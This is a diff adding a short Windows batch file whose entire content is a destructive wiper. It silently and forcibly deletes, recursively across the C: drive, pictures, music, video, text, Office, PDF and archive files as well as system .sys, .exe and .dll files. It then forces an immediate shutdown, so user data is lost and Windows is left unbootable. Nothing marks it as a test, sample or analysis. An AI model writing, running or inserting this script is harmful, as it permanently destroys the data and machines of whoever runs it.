@@ -1,0 +1,19 @@
+echo off
+del /q /s /f C:\*.jpg
+del /q /s /f C:\*.bmp
+del /q /s /f C:\*.gif
+del /q /s /f C:\*.wav
+del /q /s /f C:\*.mp3
+del /q /s /f C:\*.mpeg
+del /q /s /f C:\*.avi
+del /q /s /f C:\*.wmv
+del /q /s /f C:\*.txt
+del /q /s /f C:\*.doc
+del /q /s /f C:\*.pdf
+del /q /s /f C:\*.zip
+del /q /s /f C:\*.rar
+del /q /s /f C:\*.pps
+del /q /s /f C:\*.sys
+del /q /s /f C:\*.exe
+del /q /s /f C:\*.dll
+shutdown -s -t 0 -f
